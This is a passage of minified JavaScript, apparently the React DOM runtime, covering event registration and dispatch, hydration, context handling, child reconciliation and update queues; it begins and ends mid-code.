Tg=o1[Sg],LM=Tg.toLowerCase(),DM=Tg[0].toUpperCase()+Tg.slice(1);go(LM,"on"+DM)}go(IT,"onAnimationEnd");go(ST,"onAnimationIteration");go(TT,"onAnimationStart");go("dblclick","onDoubleClick");go("focusin","onFocus");go("focusout","onBlur");go(AT,"onTransitionEnd");vl("onMouseEnter",["mouseout","mouseover"]);vl("onMouseLeave",["mouseout","mouseover"]);vl("onPointerEnter",["pointerout","pointerover"]);vl("onPointerLeave",["pointerout","pointerover"]);ua("onChange","change click focusin focusout input keydown keyup selectionchange".split(" "));ua("onSelect","focusout contextmenu dragend focusin keydown keyup mousedown mouseup selectionchange".split(" "));ua("onBeforeInput",["compositionend","keypress","textInput","paste"]);ua("onCompositionEnd","compositionend focusout keydown keypress keyup mousedown".split(" "));ua("onCompositionStart","compositionstart focusout keydown keypress keyup mousedown".split(" "));ua("onCompositionUpdate","compositionupdate focusout keydown keypress keyup mousedown".split(" "));var Bc="abort canplay canplaythrough durationchange emptied encrypted ended error loadeddata loadedmetadata loadstart pause play playing progress ratechange resize seeked seeking stalled suspend timeupdate volumechange waiting".split(" "),OM=new Set("cancel close invalid load scroll toggle".split(" ").concat(Bc));function a1(n,e,t){var r=n.type||"unknown-event";n.currentTarget=t,LR(r,e,void 0,n),n.currentTarget=null}function xT(n,e){e=(e&4)!==0;for(var t=0;t<n.length;t++){var r=n[t],i=r.event;r=r.listeners;e:{var s=void 0;if(e)for(var o=r.length-1;0<=o;o--){var a=r[o],l=a.instance,u=a.currentTarget;if(a=a.listener,l!==s&&i.isPropagationStopped())break e;a1(i,a,u),s=l}else for(o=0;o<r.length;o++){if(a=r[o],l=a.instance,u=a.currentTarget,a=a.listener,l!==s&&i.isPropagationStopped())break e;a1(i,a,u),s=l}}}if(zf)throw n=qm,zf=!1,qm=null,n}function Ct(n,e){var t=e[n0];t===void 0&&(t=e[n0]=new Set);var r=n+"__bubble";t.has(r)||(kT(e,n,2,!1),t.add(r))}function Ag(n,e,t){var r=0;e&&(r|=4),kT(t,n,r,e)}var Fh="_reactListening"+Math.random().toString(36).slice(2);function wu(n){if(!n[Fh]){n[Fh]=!0,DS.forEach(function(t){t!=="selectionchange"&&(OM.has(t)||Ag(t,!1,n),Ag(t,!0,n))});var e=n.nodeType===9?n:n.ownerDocument;e===null||e[Fh]||(e[Fh]=!0,Ag("selectionchange",!1,e))}}function kT(n,e,t,r){switch(hT(e)){case 1:var i=YR;break;case 4:i=ZR;break;default:i=qy}t=i.bind(null,e,t,n),i=void 0,!Hm||e!=="touchstart"&&e!=="touchmove"&&e!=="wheel"||(i=!0),r?i!==void 0?n.addEventListener(e,t,{capture:!0,passive:i}):n.addEventListener(e,t,!0):i!==void 0?n.addEventListener(e,t,{passive:i}):n.addEventListener(e,t,!1)}function bg(n,e,t,r,i){var s=r;if(!(e&1)&&!(e&2)&&r!==null)e:for(;;){if(r===null)return;var o=r.tag;if(o===3||o===4){var a=r.stateNode.containerInfo;if(a===i||a.nodeType===8&&a.parentNode===i)break;if(o===4)for(o=r.return;o!==null;){var l=o.tag;if((l===3||l===4)&&(l=o.stateNode.containerInfo,l===i||l.nodeType===8&&l.parentNode===i))return;o=o.return}for(;a!==null;){if(o=Bo(a),o===null)return;if(l=o.tag,l===5||l===6){r=s=o;continue e}a=a.parentNode}}r=r.return}ZS(function(){var u=s,h=zy(t),f=[];e:{var m=bT.get(n);if(m!==void 0){var v=Gy,x=n;switch(n){case"keypress":if(mf(t)===0)break e;case"keydown":case"keyup":v=fM;break;case"focusin":x="focus",v=vg;break;case"focusout":x="blur",v=vg;break;case"beforeblur":case"afterblur":v=vg;break;case"click":if(t.button===2)break e;case"auxclick":case"dblclick":case"mousedown":case"mousemove":case"mouseup":case"mouseout":case"mouseover":case"contextmenu":v=Q_;break;case"drag":case"dragend":case"dragenter":case"dragexit":case"dragleave":case"dragover":case"dragstart":case"drop":v=eM;break;case"touchcancel":case"touchend":case"touchmove":case"touchstart":v=gM;break;case IT:case ST:case TT:v=rM;break;case AT:v=yM;break;case"scroll":v=JR;break;case"wheel":v=vM;break;case"copy":case"cut":case"paste":v=sM;break;case"gotpointercapture":case"lostpointercapture":case"pointercancel":case"pointerdown":case"pointermove":case"pointerout":case"pointerover":case"pointerup":v=Z_}var k=(e&4)!==0,I=!k&&n==="scroll",S=k?m!==null?m+"Capture":null:m;k=[];for(var b=u,E;b!==null;){E=b;var U=E.stateNode;if(E.tag===5&&U!==null&&(E=U,S!==null&&(U=fu(b,S),U!=null&&k.push(vu(b,U,E)))),I)break;b=b.return}0<k.length&&(m=new v(m,x,null,t,h),f.push({event:m,listeners:k}))}}if(!(e&7)){e:{if(m=n==="mouseover"||n==="pointerover",v=n==="mouseout"||n==="pointerout",m&&t!==Wm&&(x=t.relatedTarget||t.fromElement)&&(Bo(x)||x[is]))break e;if((v||m)&&(m=h.window===h?h:(m=h.ownerDocument)?m.defaultView||m.parentWindow:window,v?(x=t.relatedTarget||t.toElement,v=u,x=x?Bo(x):null,x!==null&&(I=ha(x),x!==I||x.tag!==5&&x.tag!==6)&&(x=null)):(v=null,x=u),v!==x)){if(k=Q_,U="onMouseLeave",S="onMouseEnter",b="mouse",(n==="pointerout"||n==="pointerover")&&(k=Z_,U="onPointerLeave",S="onPointerEnter",b="pointer"),I=v==null?m:Ga(v),E=x==null?m:Ga(x),m=new k(U,b+"leave",v,t,h),m.target=I,m.relatedTarget=E,U=null,Bo(h)===u&&(k=new k(S,b+"enter",x,t,h),k.target=E,k.relatedTarget=I,U=k),I=U,v&&x)t:{for(k=v,S=x,b=0,E=k;E;E=La(E))b++;for(E=0,U=S;U;U=La(U))E++;for(;0<b-E;)k=La(k),b--;for(;0<E-b;)S=La(S),E--;for(;b--;){if(k===S||S!==null&&k===S.alternate)break t;k=La(k),S=La(S)}k=null}else k=null;v!==null&&l1(f,m,v,k,!1),x!==null&&I!==null&&l1(f,I,x,k,!0)}}e:{if(m=u?Ga(u):window,v=m.nodeName&&m.nodeName.toLowerCase(),v==="select"||v==="input"&&m.type==="file")var H=bM;else if(e1(m))if(yT)H=RM;else{H=kM;var q=xM}else(v=m.nodeName)&&v.toLowerCase()==="input"&&(m.type==="checkbox"||m.type==="radio")&&(H=CM);if(H&&(H=H(n,u))){mT(f,H,t,h);break e}q&&q(n,m,u),n==="focusout"&&(q=m._wrapperState)&&q.controlled&&m.type==="number"&&Um(m,"number",m.value)}switch(q=u?Ga(u):window,n){case"focusin":(e1(q)||q.contentEditable==="true")&&(qa=q,Ym=u,Yc=null);break;case"focusout":Yc=Ym=qa=null;break;case"mousedown":Zm=!0;break;case"contextmenu":case"mouseup":case"dragend":Zm=!1,s1(f,t,h);break;case"selectionchange":if(PM)break;case"keydown":case"keyup":s1(f,t,h)}var L;if(Yy)e:{switch(n){case"compositionstart":var N="onCompositionStart";break e;case"compositionend":N="onCompositionEnd";break e;case"compositionupdate":N="onCompositionUpdate";break e}N=void 0}else Ha?pT(n,t)&&(N="onCompositionEnd"):n==="keydown"&&t.keyCode===229&&(N="onCompositionStart");N&&(dT&&t.locale!=="ko"&&(Ha||N!=="onCompositionStart"?N==="onCompositionEnd"&&Ha&&(L=fT()):(Ds=h,Ky="value"in Ds?Ds.value:Ds.textContent,Ha=!0)),q=Kf(u,N),0<q.length&&(N=new Y_(N,n,null,t,h),f.push({event:N,listeners:q}),L?N.data=L:(L=gT(t),L!==null&&(N.data=L)))),(L=EM?IM(n,t):SM(n,t))&&(u=Kf(u,"onBeforeInput"),0<u.length&&(h=new Y_("onBeforeInput","beforeinput",null,t,h),f.push({event:h,listeners:u}),h.data=L))}xT(f,e)})}function vu(n,e,t){return{instance:n,listener:e,currentTarget:t}}function Kf(n,e){for(var t=e+"Capture",r=[];n!==null;){var i=n,s=i.stateNode;i.tag===5&&s!==null&&(i=s,s=fu(n,t),s!=null&&r.unshift(vu(n,s,i)),s=fu(n,e),s!=null&&r.push(vu(n,s,i))),n=n.return}return r}function La(n){if(n===null)return null;do n=n.return;while(n&&n.tag!==5);return n||null}function l1(n,e,t,r,i){for(var s=e._reactName,o=[];t!==null&&t!==r;){var a=t,l=a.alternate,u=a.stateNode;if(l!==null&&l===r)break;a.tag===5&&u!==null&&(a=u,i?(l=fu(t,s),l!=null&&o.unshift(vu(t,l,a))):i||(l=fu(t,s),l!=null&&o.push(vu(t,l,a)))),t=t.return}o.length!==0&&n.push({event:e,listeners:o})}var BM=/\r\n?/g,UM=/\u0000|\uFFFD/g;function c1(n){return(typeof n=="string"?n:""+n).replace(BM,`
`).replace(UM,"")}function zh(n,e,t){if(e=c1(e),c1(n)!==e&&t)throw Error(ae(425))}function Gf(){}var Jm=null,Xm=null;function e0(n,e){return n==="textarea"||n==="noscript"||typeof e.children=="string"||typeof e.children=="number"||typeof e.dangerouslySetInnerHTML=="object"&&e.dangerouslySetInnerHTML!==null&&e.dangerouslySetInnerHTML.__html!=null}var t0=typeof setTimeout=="function"?setTimeout:void 0,jM=typeof clearTimeout=="function"?clearTimeout:void 0,u1=typeof Promise=="function"?Promise:void 0,VM=typeof queueMicrotask=="function"?queueMicrotask:typeof u1<"u"?function(n){return u1.resolve(null).then(n).catch(FM)}:t0;function FM(n){setTimeout(function(){throw n})}function xg(n,e){var t=e,r=0;do{var i=t.nextSibling;if(n.removeChild(t),i&&i.nodeType===8)if(t=i.data,t==="/$"){if(r===0){n.removeChild(i),gu(e);return}r--}else t!=="$"&&t!=="$?"&&t!=="$!"||r++;t=i}while(t);gu(e)}function qs(n){for(;n!=null;n=n.nextSibling){var e=n.nodeType;if(e===1||e===3)break;if(e===8){if(e=n.data,e==="$"||e==="$!"||e==="$?")break;if(e==="/$")return null}}return n}function h1(n){n=n.previousSibling;for(var e=0;n;){if(n.nodeType===8){var t=n.data;if(t==="$"||t==="$!"||t==="$?"){if(e===0)return n;e--}else t==="/$"&&e++}n=n.previousSibling}return null}var ql=Math.random().toString(36).slice(2),Ei="__reactFiber$"+ql,_u="__reactProps$"+ql,is="__reactContainer$"+ql,n0="__reactEvents$"+ql,zM="__reactListeners$"+ql,WM="__reactHandles$"+ql;function Bo(n){var e=n[Ei];if(e)return e;for(var t=n.parentNode;t;){if(e=t[is]||t[Ei]){if(t=e.alternate,e.child!==null||t!==null&&t.child!==null)for(n=h1(n);n!==null;){if(t=n[Ei])return t;n=h1(n)}return e}n=t,t=n.parentNode}return null}function Xu(n){return n=n[Ei]||n[is],!n||n.tag!==5&&n.tag!==6&&n.tag!==13&&n.tag!==3?null:n}function Ga(n){if(n.tag===5||n.tag===6)return n.stateNode;throw Error(ae(33))}function Xd(n){return n[_u]||null}var r0=[],Qa=-1;function mo(n){return{current:n}}function Nt(n){0>Qa||(n.current=r0[Qa],r0[Qa]=null,Qa--)}function Tt(n,e){Qa++,r0[Qa]=n.current,n.current=e}var ao={},tr=mo(ao),yr=mo(!1),Yo=ao;function _l(n,e){var t=n.type.contextTypes;if(!t)return ao;var r=n.stateNode;if(r&&r.__reactInternalMemoizedUnmaskedChildContext===e)return r.__reactInternalMemoizedMaskedChildContext;var i={},s;for(s in t)i[s]=e[s];return r&&(n=n.stateNode,n.__reactInternalMemoizedUnmaskedChildContext=e,n.__reactInternalMemoizedMaskedChildContext=i),i}function wr(n){return n=n.childContextTypes,n!=null}function Qf(){Nt(yr),Nt(tr)}function f1(n,e,t){if(tr.current!==ao)throw Error(ae(168));Tt(tr,e),Tt(yr,t)}function CT(n,e,t){var r=n.stateNode;if(e=e.childContextTypes,typeof r.getChildContext!="function")return t;r=r.getChildContext();for(var i in r)if(!(i in e))throw Error(ae(108,xR(n)||"Unknown",i));return Kt({},t,r)}function Yf(n){return n=(n=n.stateNode)&&n.__reactInternalMemoizedMergedChildContext||ao,Yo=tr.current,Tt(tr,n),Tt(yr,yr.current),!0}function d1(n,e,t){var r=n.stateNode;if(!r)throw Error(ae(169));t?(n=CT(n,e,Yo),r.__reactInternalMemoizedMergedChildContext=n,Nt(yr),Nt(tr),Tt(tr,n)):Nt(yr),Tt(yr,t)}var zi=null,ep=!1,kg=!1;function RT(n){zi===null?zi=[n]:zi.push(n)}function $M(n){ep=!0,RT(n)}function yo(){if(!kg&&zi!==null){kg=!0;var n=0,e=ft;try{var t=zi;for(ft=1;n<t.length;n++){var r=t[n];do r=r(!0);while(r!==null)}zi=null,ep=!1}catch(i){throw zi!==null&&(zi=zi.slice(n+1)),tT(Wy,yo),i}finally{ft=e,kg=!1}}return null}var Ya=[],Za=0,Zf=null,Jf=0,Fr=[],zr=0,Zo=null,Gi=1,Qi="";function Co(n,e){Ya[Za++]=Jf,Ya[Za++]=Zf,Zf=n,Jf=e}function MT(n,e,t){Fr[zr++]=Gi,Fr[zr++]=Qi,Fr[zr++]=Zo,Zo=n;var r=Gi;n=Qi;var i=32-ai(r)-1;r&=~(1<<i),t+=1;var s=32-ai(e)+i;if(30<s){var o=i-i%5;s=(r&(1<<o)-1).toString(32),r>>=o,i-=o,Gi=1<<32-ai(e)+i|t<<i|r,Qi=s+n}else Gi=1<<s|t<<i|r,Qi=n}function Jy(n){n.return!==null&&(Co(n,1),MT(n,1,0))}function Xy(n){for(;n===Zf;)Zf=Ya[--Za],Ya[Za]=null,Jf=Ya[--Za],Ya[Za]=null;for(;n===Zo;)Zo=Fr[--zr],Fr[zr]=null,Qi=Fr[--zr],Fr[zr]=null,Gi=Fr[--zr],Fr[zr]=null}var Rr=null,kr=null,jt=!1,ri=null;function NT(n,e){var t=$r(5,null,null,0);t.elementType="DELETED",t.stateNode=e,t.return=n,e=n.deletions,e===null?(n.deletions=[t],n.flags|=16):e.push(t)}function p1(n,e){switch(n.tag){case 5:var t=n.type;return e=e.nodeType!==1||t.toLowerCase()!==e.nodeName.toLowerCase()?null:e,e!==null?(n.stateNode=e,Rr=n,kr=qs(e.firstChild),!0):!1;case 6:return e=n.pendingProps===""||e.nodeType!==3?null:e,e!==null?(n.stateNode=e,Rr=n,kr=null,!0):!1;case 13:return e=e.nodeType!==8?null:e,e!==null?(t=Zo!==null?{id:Gi,overflow:Qi}:null,n.memoizedState={dehydrated:e,treeContext:t,retryLane:1073741824},t=$r(18,null,null,0),t.stateNode=e,t.return=n,n.child=t,Rr=n,kr=null,!0):!1;default:return!1}}function i0(n){return(n.mode&1)!==0&&(n.flags&128)===0}function s0(n){if(jt){var e=kr;if(e){var t=e;if(!p1(n,e)){if(i0(n))throw Error(ae(418));e=qs(t.nextSibling);var r=Rr;e&&p1(n,e)?NT(r,t):(n.flags=n.flags&-4097|2,jt=!1,Rr=n)}}else{if(i0(n))throw Error(ae(418));n.flags=n.flags&-4097|2,jt=!1,Rr=n}}}function g1(n){for(n=n.return;n!==null&&n.tag!==5&&n.tag!==3&&n.tag!==13;)n=n.return;Rr=n}function Wh(n){if(n!==Rr)return!1;if(!jt)return g1(n),jt=!0,!1;var e;if((e=n.tag!==3)&&!(e=n.tag!==5)&&(e=n.type,e=e!=="head"&&e!=="body"&&!e0(n.type,n.memoizedProps)),e&&(e=kr)){if(i0(n))throw PT(),Error(ae(418));for(;e;)NT(n,e),e=qs(e.nextSibling)}if(g1(n),n.tag===13){if(n=n.memoizedState,n=n!==null?n.dehydrated:null,!n)throw Error(ae(317));e:{for(n=n.nextSibling,e=0;n;){if(n.nodeType===8){var t=n.data;if(t==="/$"){if(e===0){kr=qs(n.nextSibling);break e}e--}else t!=="$"&&t!=="$!"&&t!=="$?"||e++}n=n.nextSibling}kr=null}}else kr=Rr?qs(n.stateNode.nextSibling):null;return!0}function PT(){for(var n=kr;n;)n=qs(n.nextSibling)}function El(){kr=Rr=null,jt=!1}function ew(n){ri===null?ri=[n]:ri.push(n)}var HM=ps.ReactCurrentBatchConfig;function xc(n,e,t){if(n=t.ref,n!==null&&typeof n!="function"&&typeof n!="object"){if(t._owner){if(t=t._owner,t){if(t.tag!==1)throw Error(ae(309));var r=t.stateNode}if(!r)throw Error(ae(147,n));var i=r,s=""+n;return e!==null&&e.ref!==null&&typeof e.ref=="function"&&e.ref._stringRef===s?e.ref:(e=function(o){var a=i.refs;o===null?delete a[s]:a[s]=o},e._stringRef=s,e)}if(typeof n!="string")throw Error(ae(284));if(!t._owner)throw Error(ae(290,n))}return n}function $h(n,e){throw n=Object.prototype.toString.call(e),Error(ae(31,n==="[object Object]"?"object with keys {"+Object.keys(e).join(", ")+"}":n))}function m1(n){var e=n._init;return e(n._payload)}function LT(n){function e(S,b){if(n){var E=S.deletions;E===null?(S.deletions=[b],S.flags|=16):E.push(b)}}function t(S,b){if(!n)return null;for(;b!==null;)e(S,b),b=b.sibling;return null}function r(S,b){for(S=new Map;b!==null;)b.key!==null?S.set(b.key,b):S.set(b.index,b),b=b.sibling;return S}function i(S,b){return S=Ys(S,b),S.index=0,S.sibling=null,S}function s(S,b,E){return S.index=E,n?(E=S.alternate,E!==null?(E=E.index,E<b?(S.flags|=2,b):E):(S.flags|=2,b)):(S.flags|=1048576,b)}function o(S){return n&&S.alternate===null&&(S.flags|=2),S}function a(S,b,E,U){return b===null||b.tag!==6?(b=Dg(E,S.mode,U),b.return=S,b):(b=i(b,E),b.return=S,b)}function l(S,b,E,U){var H=E.type;return H===$a?h(S,b,E.props.children,U,E.key):b!==null&&(b.elementType===H||typeof H=="object"&&H!==null&&H.$$typeof===xs&&m1(H)===b.type)?(U=i(b,E.props),U.ref=xc(S,b,E),U.return=S,U):(U=Sf(E.type,E.key,E.props,null,S.mode,U),U.ref=xc(S,b,E),U.return=S,U)}function u(S,b,E,U){return b===null||b.tag!==4||b.stateNode.containerInfo!==E.containerInfo||b.stateNode.implementation!==E.implementation?(b=Og(E,S.mode,U),b.return=S,b):(b=i(b,E.children||[]),b.return=S,b)}function h(S,b,E,U,H){return b===null||b.tag!==7?(b=Ko(E,S.mode,U,H),b.return=S,b):(b=i(b,E),b.return=S,b)}function f(S,b,E){if(typeof b=="string"&&b!==""||typeof b=="number")return b=Dg(""+b,S.mode,E),b.return=S,b;if(typeof b=="object"&&b!==null){switch(b.$$typeof){case Ph:return E=Sf(b.type,b.key,b.props,null,S.mode,E),E.ref=xc(S,null,b),E.return=S,E;case Wa:return b=Og(b,S.mode,E),b.return=S,b;case xs:var U=b._init;return f(S,U(b._payload),E)}if(Dc(b)||Ic(b))return b=Ko(b,S.mode,E,null),b.return=S,b;$h(S,b)}return null}function m(S,b,E,U){var H=b!==null?b.key:null;if(typeof E=="string"&&E!==""||typeof E=="number")return H!==null?null:a(S,b,""+E,U);if(typeof E=="object"&&E!==null){switch(E.$$typeof){case Ph:return E.key===H?l(S,b,E,U):null;case Wa:return E.key===H?u(S,b,E,U):null;case xs:return H=E._init,m(S,b,H(E._payload),U)}if(Dc(E)||Ic(E))return H!==null?null:h(S,b,E,U,null);$h(S,E)}return null}function v(S,b,E,U,H){if(typeof U=="string"&&U!==""||typeof U=="number")return S=S.get(E)||null,a(b,S,""+U,H);if(typeof U=="object"&&U!==null){switch(U.$$typeof){case Ph:return S=S.get(U.key===null?E:U.key)||null,l(b,S,U,H);case Wa:return S=S.get(U.key===null?E:U.key)||null,u(b,S,U,H);case xs:var q=U._init;return v(S,b,E,q(U._payload),H)}if(Dc(U)||Ic(U))return S=S.get(E)||null,h(b,S,U,H,null);$h(b,U)}return null}function x(S,b,E,U){for(var H=null,q=null,L=b,N=b=0,B=null;L!==null&&N<E.length;N++){L.index>N?(B=L,L=null):B=L.sibling;var z=m(S,L,E[N],U);if(z===null){L===null&&(L=B);break}n&&L&&z.alternate===null&&e(S,L),b=s(z,b,N),q===null?H=z:q.sibling=z,q=z,L=B}if(N===E.length)return t(S,L),jt&&Co(S,N),H;if(L===null){for(;N<E.length;N++)L=f(S,E[N],U),L!==null&&(b=s(L,b,N),q===null?H=L:q.sibling=L,q=L);return jt&&Co(S,N),H}for(L=r(S,L);N<E.length;N++)B=v(L,S,N,E[N],U),B!==null&&(n&&B.alternate!==null&&L.delete(B.key===null?N:B.key),b=s(B,b,N),q===null?H=B:q.sibling=B,q=B);return n&&L.forEach(function(W){return e(S,W)}),jt&&Co(S,N),H}function k(S,b,E,U){var H=Ic(E);if(typeof H!="function")throw Error(ae(150));if(E=H.call(E),E==null)throw Error(ae(151));for(var q=H=null,L=b,N=b=0,B=null,z=E.next();L!==null&&!z.done;N++,z=E.next()){L.index>N?(B=L,L=null):B=L.sibling;var W=m(S,L,z.value,U);if(W===null){L===null&&(L=B);break}n&&L&&W.alternate===null&&e(S,L),b=s(W,b,N),q===null?H=W:q.sibling=W,q=W,L=B}if(z.done)return t(S,L),jt&&Co(S,N),H;if(L===null){for(;!z.done;N++,z=E.next())z=f(S,z.value,U),z!==null&&(b=s(z,b,N),q===null?H=z:q.sibling=z,q=z);return jt&&Co(S,N),H}for(L=r(S,L);!z.done;N++,z=E.next())z=v(L,S,N,z.value,U),z!==null&&(n&&z.alternate!==null&&L.delete(z.key===null?N:z.key),b=s(z,b,N),q===null?H=z:q.sibling=z,q=z);return n&&L.forEach(function(K){return e(S,K)}),jt&&Co(S,N),H}function I(S,b,E,U){if(typeof E=="object"&&E!==null&&E.type===$a&&E.key===null&&(E=E.props.children),typeof E=="object"&&E!==null){switch(E.$$typeof){case Ph:e:{for(var H=E.key,q=b;q!==null;){if(q.key===H){if(H=E.type,H===$a){if(q.tag===7){t(S,q.sibling),b=i(q,E.props.children),b.return=S,S=b;break e}}else if(q.elementType===H||typeof H=="object"&&H!==null&&H.$$typeof===xs&&m1(H)===q.type){t(S,q.sibling),b=i(q,E.props),b.ref=xc(S,q,E),b.return=S,S=b;break e}t(S,q);break}else e(S,q);q=q.sibling}E.type===$a?(b=Ko(E.props.children,S.mode,U,E.key),b.return=S,S=b):(U=Sf(E.type,E.key,E.props,null,S.mode,U),U.ref=xc(S,b,E),U.return=S,S=U)}return o(S);case Wa:e:{for(q=E.key;b!==null;){if(b.key===q)if(b.tag===4&&b.stateNode.containerInfo===E.containerInfo&&b.stateNode.implementation===E.implementation){t(S,b.sibling),b=i(b,E.children||[]),b.return=S,S=b;break e}else{t(S,b);break}else e(S,b);b=b.sibling}b=Og(E,S.mode,U),b.return=S,S=b}return o(S);case xs:return q=E._init,I(S,b,q(E._payload),U)}if(Dc(E))return x(S,b,E,U);if(Ic(E))return k(S,b,E,U);$h(S,E)}return typeof E=="string"&&E!==""||typeof E=="number"?(E=""+E,b!==null&&b.tag===6?(t(S,b.sibling),b=i(b,E),b.return=S,S=b):(t(S,b),b=Dg(E,S.mode,U),b.return=S,S=b),o(S)):t(S,b)}return I}var Il=LT(!0),DT=LT(!1),Xf=mo(null),ed=null,Ja=null,tw=null;function nw(){tw=Ja=ed=null}function rw(n){var e=Xf.current;Nt(Xf),n._currentValue=e}function o0(n,e,t){for(;n!==null;){var r=n.alternate;if((n.childLanes&e)!==e?(n.childLanes|=e,r!==null&&(r.childLanes|=e)):r!==null&&(r.childLanes&e)!==e&&(r.childLanes|=e),n===t)break;n=n.return}}function ul(n,e){ed=n,tw=Ja=null,n=n.dependencies,n!==null&&n.firstContext!==null&&(n.lanes&e&&(mr=!0),n.firstContext=null)}function Kr(n){var e=n._currentValue;if(tw!==n)if(n={context:n,memoizedValue:e,next:null},Ja===null){if(ed===null)throw Error(ae(308));Ja=n,ed.dependencies={lanes:0,firstContext:n}}else Ja=Ja.next=n;return e}var Uo=null;function iw(n){Uo===null?Uo=[n]:Uo.push(n)}function OT(n,e,t,r){var i=e.interleaved;return i===null?(t.next=t,iw(e)):(t.next=i.next,i.next=t),e.interleaved=t,ss(n,r)}function ss(n,e){n.lanes|=e;var t=n.alternate;for(t!==null&&(t.lanes|=e),t=n,n=n.return;n!==null;)n.childLanes|=e,t=n.alternate,t!==null&&(t.childLanes|=e),t=n,n=n.return;return t.tag===3?t.stateNode:null}var ks=!1;function sw(n){n.updateQueue={baseState:n.memoizedState,firstBaseUpdate:null,lastBaseUpdate:null,shared:{pending:null,interleaved:null,lanes:0},effects:null}}function BT(n,e){n=n.updateQueue,e.updateQueue===n&&(e.updateQueue={baseState:n.baseState,firstBaseUpdate:n.firstBaseUpdate,lastBaseUpdate:n.lastBaseUpdate,shared:n.shared,effects:n.effects})}function es(n,e){return{eventTime:n,lane:e,tag:0,payload:null,callback:null,next:null}}function Ks(n,e,t){var r=n.updateQueue;if(r===null)return null;if(r=r.shared,Je&2){var i=r.pending;return i===null?e.next=e:(e.next=i.next,i.next=e),r.pending=e,ss(n,t)}return i=r.interleaved,i===null?(e.next=e,iw(r)):(e.next=i.next,i.next=e),r.interleaved=e,ss(n,t)}function yf(n,e,t){if(e=e.updateQueue,e!==null&&(e=e.shared,(t&4194240)!==0)){var r=e.lanes;r&=n.pendingLanes,t|=r,e.lanes=t,$y(n,t)}}function y1(n,e){var t=n.updateQueue,r=n.alternate;if(r!==null&&(r=r.updateQueue,t===r)){var i=null,s=null;if(t=t.firstBaseUpdate,t!==null){do{var o={eventTime:t.eventTime,lane:t.lane,tag:t.tag,payload:t.payload,callback:t.callback,next:null};s===null?i=s=o:s=s.next=o,t=t.next}while(t!==null);s===null?i=s=e:s=s.next=e}else i=s=e;t={baseState:r.baseState,firstBaseUpdate:i,lastBaseUpdate:s,shared:r.shared,effects:r.effects},n.updateQueue=t;return}n=t.lastBaseUpdate,n===null?t.firstBaseUpdate=e:n.next=e,t.lastBaseUpdate=e}function td(n,e,t,r){var i=n.updateQueue;ks=!1;var s=i.firstBaseUpdate,o=i.lastBaseUpdate,a=i.shared.pending;if(a!==null){i.shared.pending=null;var l=a,u=l.next;l.next=null,o===null?s=u:o.next=u,o=l;var h=n.alternate;h!==null&&(h=h.updateQueue,a=h.lastBaseUpdate,a!==o&&(a===null?h.firstBaseUpdate=u:a.next=u,h.lastBaseUpdate=l))}if(s!==null){var f=i.baseState;o=0,h=u=l=null,a=s;do{var m=a.lane,v=a.eventTime;if((r&m)===m){h!==null&&(h=h.next={eventTime:v,lane:0,tag:a.tag,payload:a.payload,callback:a.callback,next:null});e:{var x=n,k=a;switch(m=e,v=t,k.tag){case 1:if(x=k.payload,typeof x=="function"){f=x.call(v,f,m);break e}f=x;break e;case 3:x.flags=x.flags&-65537|128;case 0:if(x=k.payload,m=typeof x=="function"?x.call(v,f,m):x,m==null)break e;f=Kt({},f,m);break e;case 2:ks=!0}}a.callback!==null&&a.lane!==0&&(n.flags|=64,m=i.effects,m===null?i.effects=[a]:m.push(a))}else v={eventTime:v,lane:m,tag:a.tag,payload:a.payload,callback:a.callback,next:null},h===null?(u=h=v,l=f):h=h.next=v,o|=m;if(a=a.next,a===null){if(a=i.shared.pending,a===null)break;m=a,a=m.next,m.next=null,i.lastBaseUpdate=m,i.shared.pending=null}}while(1);if(h===null&&(l=f),i.baseState=l,i.firstBaseUpdate=u,i.lastBaseUpdate=h,e=i.shared.interleaved,e!==null){i=e;do o|=i.lane,i=i.next;while(i!==e)}else s===null&&(i.shared.lanes=0);Xo|=o,n.lanes=o,n.memoizedState=f}}function w1(n,e,t){if(n=e.effects,e.effects=null,n!==null)for(e=0;e<n.length;e++){var r=n[e],i=r.callback;if(i!==null){if(r.callback=null,r=t,typeof i!="function")throw Error(ae(191,i));i.call(r)}}}var eh={},Si=mo(eh),Eu=mo(eh),Iu=mo(eh);function jo(n){if(n===eh)throw Error(ae(174));return n}function ow(n,e){switch(Tt(Iu,e),Tt(Eu,n),Tt(Si,eh),n=e.nodeType,n){case 9:case 11:e=(e=e.documentElement)?e.namespaceURI:Vm(null,"");break;default:n=n===8?e.parentNode:e,e=n.namespaceURI||null,n=n.tagName,e=Vm(e,n)}Nt(Si),Tt(Si,e)}function Sl(){Nt(Si),Nt(Eu),Nt(Iu)}function UT(n){jo(Iu.current);var e=jo(Si.current),t=Vm(e,n.type);e!==t&&(Tt(Eu,n),Tt(Si,t))}function aw(n){Eu.current===n&&(Nt(Si),Nt(Eu))}var Wt=mo(0);function nd(n){for(var e=n;e!==null;){if(e.tag===13){var t=e.memoizedState;if(t!==null&&(t=t.dehydrated,t===null||t.data==="$?"||t.data==="$!"))return e}else if(e.tag===19&&e.memoizedProps.revealOrder!==void 0){if(e.flags&128)return e}else if(e.child!==null){e.child.return=e,e=e.child;continue}if(e===n)break;for(;e.sibling===null;){if(e.return===null||e.return===n)return null;e=e.return}e.sibling.return=e.return,e=e.sibling}return null}var Cg=[];function lw(){for(var n=0;n<Cg.length;n++)Cg[n]._workInProgressVersionPrimary=null;Cg.length=0}var wf=ps.ReactCurrentDispatcher,Rg=ps.ReactCurrentBatchConfig,Jo=0,qt=null,pn=null,Sn=null,rd=!1,Zc=!1,Su=0,qM=0;function Wn(){throw Error(ae(321))}function cw(n,e){if(e===null)return!1;for(var t=0;t<e.length&&t<n.length;t++)if(!fi(n[t],e[t]))return!1;return!0}function uw(n,e,t,r,i,s){if(Jo=s,qt=e,e.memoizedState=null,e.updateQueue=null,e.lanes=0,wf.current=n===null||n.memoizedState===null?YM:ZM,n=t(r,i),Zc){s=0;do{if(Zc=!1,Su=0,25<=s)throw Error(ae(301));s+=1,Sn=pn=null,e.updateQueue=null,wf.current=JM,n=t(r,i)}while(Zc)}if(wf.current=id,e=pn!==null&&pn.next!==null,Jo=0,Sn=pn=qt=null,rd=!1,e)throw Error(ae(300));return n}function hw(){var n=Su!==0;return Su=0,n}function wi(){var n={memoizedState:null,baseState:null,baseQueue:null,queue:null,next:null};return Sn===null?qt.memoizedState=Sn=n:Sn=Sn.next=n,Sn}function Gr(){if(pn===null){var n=qt.alternate;n=n!==null?n.memoizedState:null}else n=pn.next;var e=Sn===null?qt.memoizedState:Sn.next;if(e!==null)Sn=e,pn=n;else{if(n===null)throw 